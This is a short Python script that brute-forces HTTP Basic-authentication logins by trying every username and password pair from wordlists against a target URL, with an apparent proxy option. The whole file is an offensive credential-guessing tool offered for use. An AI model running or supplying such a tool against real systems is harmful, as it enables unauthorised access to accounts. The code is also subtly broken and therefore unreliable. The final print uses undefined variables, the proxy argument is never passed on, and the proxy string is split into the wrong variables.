import urllib.request
from urllib.error import URLError
import argparse

def prompt():
    """Prompt and parse arguments"""
    parser = argparse.ArgumentParser(
            prog='Minimal Bruteforce\n',
            description='Program uses urllib (built-in) to bruteforce login through Basic authentification workflow\n',
            epilog='skillz ~ minimal-software'
            )
    parser.add_argument("URL", help="top level url to bruteforce. This would be the first webpage requiring authentification (eg: https://www.example.com/admin).\n", type=str)
    parser.add_argument("-u", dest="usernames", help="path to username wordlist\n", type=str)
    parser.add_argument("-p", dest="passwords", help="path to password wordlist\n", type=str)
    parser.add_argument("-q","--quiet", help="quiet mode\n", action="store_true")
    parser.add_argument("-x", dest="proxy", help="proxy support (eg: http://example.com:9999)\n", type=str)
    args = parser.parse_args()
    return args
    #parser.add_argument('-a')  #api

def clean(ufile, pfile):
    """Cleaning the wordlists"""
    with open(pfile, "r") as p:
        passwords= p.readlines()
        passwords = list(map(lambda line: line.strip(), passwords))
    with open(ufile, "r") as u:
        usernames = u.readlines()
        usernames = list(map(lambda line: line.strip(), usernames))
    return (usernames, passwords)

def atk(u:list, p:list, url:str, q:bool, x=None):
    """minimal bruteforce atk"""
    # forming the request & attacking
    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm() 
    for username in u:
      for password in p:
        password_mgr.add_password(None, url, username, password) 
        handler = urllib.request.HTTPBasicAuthHandler(password_mgr) 
        opener = urllib.request.build_opener(handler)
        if x:
            host,proto = x.split("://")
            opener.set_proxy(host, proto)
        urllib.request.install_opener(opener)
        if not q:
            print(f'trying combo: {username} X {password}')
        try:
            response = urllib.request.urlopen(url)
            return (username, password)
        except URLError as e:      
            if hasattr(e, 'code'):
                print (f'Error code: {e.code}')
    print("username password combo not found!") 
    return None

if __name__ == '__main__':
    args = prompt()
    usernames,passwords = clean(args.usernames, args.passwords)
    creds = atk(usernames, passwords, args.URL, args.quiet)
    if creds:
        print(f"Combo found! {u}:{p}")
